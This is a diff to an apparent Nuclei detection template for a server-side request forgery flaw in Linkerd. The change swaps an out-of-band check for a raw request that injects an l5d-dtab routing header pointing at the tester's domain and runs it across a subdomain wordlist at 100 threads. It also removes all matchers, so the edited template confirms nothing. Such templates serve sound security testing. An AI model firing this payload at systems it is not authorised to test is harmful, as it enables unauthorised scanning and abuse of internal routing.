@@ -4,19 +4,18 @@ info:
   name: Linkerd SSRF detection
   author: dudez
   severity: high
-  reference:
-    - https://twitter.com/nirvana_msu/status/1084144955034165248
-  tags: ssrf,linkerd,oast
+  tags: ssrf,linkerd,oob
+  reference: https://twitter.com/nirvana_msu/status/1084144955034165248
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
-    headers:
-      l5d-dtab: /svc/* => /$/inet/{{interactsh-url}}/443
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the HTTP Interaction
-        words:
-          - "http"
+    raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Subdomains}}
+        Accept-Encoding: gzip, deflate
+        l5d-dtab: /svc/* => /$/inet/{{Host}}.{{Port}}.{{Subdomains}}.linkerd.{{MY-DOMAIN}}/443
